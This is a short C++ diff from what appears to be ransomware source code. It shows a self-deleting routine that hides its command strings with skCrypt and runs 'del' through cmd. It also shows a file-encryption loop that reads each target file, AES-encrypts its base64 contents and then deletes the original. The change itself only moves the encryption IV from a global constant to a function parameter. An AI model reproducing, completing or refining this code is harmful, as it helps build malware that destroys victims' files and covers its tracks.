@@ -539,7 +539,7 @@ void DeleteMe(const string& myPath) {
     system(( (string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"") ).c_str());
 }
 
-void EncryptFiles(const vector<string>& files,const string& key) {
+void EncryptFiles(const vector<string>& files, const string& key, const string& iv) {
     for (string file : files) {
 
         HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -552,7 +552,7 @@ void EncryptFiles(const vector<string>& files,const string& key) {
         vector<BYTE> data(istreambuf_iterator<char>(fin), {});
         fin.close();
 
-        string content = aes_encrypt(key, base64_encode(&data[0], data.size()), IV);
+        string content = aes_encrypt(key, base64_encode(&data[0], data.size()), iv);
 
         if (remove(file.c_str()) != 0)
             DeleteFileA(file.c_str());
